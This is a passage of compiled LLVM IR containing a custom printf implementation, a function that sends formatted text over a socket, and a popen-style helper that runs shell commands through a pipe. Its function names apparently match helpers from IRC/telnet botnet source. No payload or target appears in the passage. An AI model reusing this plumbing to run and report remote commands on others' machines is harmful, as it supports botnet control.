declare void @llvm.va_start(i8*) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @print(i8** %0, i8* %1, %struct.__va_list_tag* %2) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

12:                                               ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %286

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %275

36:                                               ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !15

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !16

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

111:                                              ; preds = %101
  br label %112

112:                                              ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i64 0, i64 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

119:                                              ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

124:                                              ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

130:                                              ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

136:                                              ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

141:                                              ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

149:                                              ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

154:                                              ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

160:                                              ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

166:                                              ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

171:                                              ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

179:                                              ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

184:                                              ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

190:                                              ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

196:                                              ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

201:                                              ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

209:                                              ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

214:                                              ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

226:                                              ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

231:                                              ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

239:                                              ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

244:                                              ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

255:                                              ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

260:                                              ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

273:                                              ; preds = %239
  br label %282

274:                                              ; preds = %17
  br label %275

275:                                              ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

282:                                              ; preds = %275, %273
  br label %283

283:                                              ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12, !llvm.loop !17

286:                                              ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

289:                                              ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

292:                                              ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @szprintf(i8* %0, i8* %1, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @sockprintf(i32 %0, i8* %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias align 16 i8* @malloc(i64 2048) #12
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #11
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #11
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #12
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #4

declare i64 @send(i32, i8*, i64, i32) #5

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpopen(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

14:                                               ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

19:                                               ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

26:                                               ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %28 = call i32 @pipe(i32* %27) #12
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

30:                                               ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

31:                                               ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

34:                                               ; preds = %31
  %35 = call i32 @getdtablesize() #12
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

37:                                               ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

38:                                               ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias align 16 i8* @malloc(i64 %43) #12
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

47:                                               ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

48:                                               ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* align 1 %50, i8 0, i64 %53, i1 false)
  br label %54

54:                                               ; preds = %48, %31
  %55 = call i32 @vfork() #13
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

56:                                               ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

63:                                               ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

68:                                               ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

72:                                               ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #12
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

79:                                               ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

83:                                               ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #12
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

94:                                               ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

98:                                               ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i64 0, i64 0), i8* %99, i8* null) #12
  call void @_exit(i32 127) #14
  unreachable

101:                                              ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

106:                                              ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

112:                                              ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

118:                                              ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

125:                                              ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #3

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #3

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdpclose(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32*, i32** @fdopen_pids, align 8
  %10 = icmp eq i32* %9, null
  br i1 %10, label %18, label %11

11:                                               ; preds = %1
  %12 = load i32*, i32** @fdopen_pids, align 8
  %13 = load i32, i32* %3, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i32, i32* %12, i64 %14
  %16 = load i32, i32* %15, align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %19

18:                                               ; preds = %11, %1
  store i32 -1, i32* %2, align 4
  br label %58

19:                                               ; preds = %11
  %20 = load i32, i32* %3, align 4
  %21 = call i32 @close(i32 %20)
  %22 = call i32 @sigemptyset(%struct.__sigset_t* %6) #12
  %23 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #12
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #12
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #12
  %26 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #12
  br label %27

27:                                               ; preds = %41, %19
  %28 = load i32*, i32** @fdopen_pids, align 8
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i32, i32* %28, i64 %30
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @waitpid(i32 %32, i32* %7, i32 0)
  store i32 %33, i32* %8, align 4
  br label %34

34:                                               ; preds = %27
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %41

37:                                               ; preds = %34
  %38 = call i32* @__errno_location() #15
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 4
  br label %41

41:                                               ; preds = %37, %34
  %42 = phi i1 [ false, %34 ], [ %40, %37 ]
  br i1 %42, label %27, label %43, !llvm.loop !18

43:                                               ; preds = %41
  %44 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #12
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %4, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  store i32 0, i32* %48, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %43
  br label %56

52:                                               ; preds = %43
  %53 = load i32, i32* %7, align 4
  %54 = and i32 %53, 65280
  %55 = ashr i32 %54, 8
  br label %56

56:                                               ; preds = %52, %51
  %57 = phi i32 [ -1, %51 ], [ %55, %52 ]
  store i32 %57, i32* %2, align 4
  br label %58

58:                                               ; preds = %56, %18
  %59 = load i32, i32* %2, align 4
  ret i32 %59
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #3

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #3

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #3

declare i32 @waitpid(i32, i32*, i32) #5

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @fdgets(i8* %0, i32 %1, i32 %2) #0 {
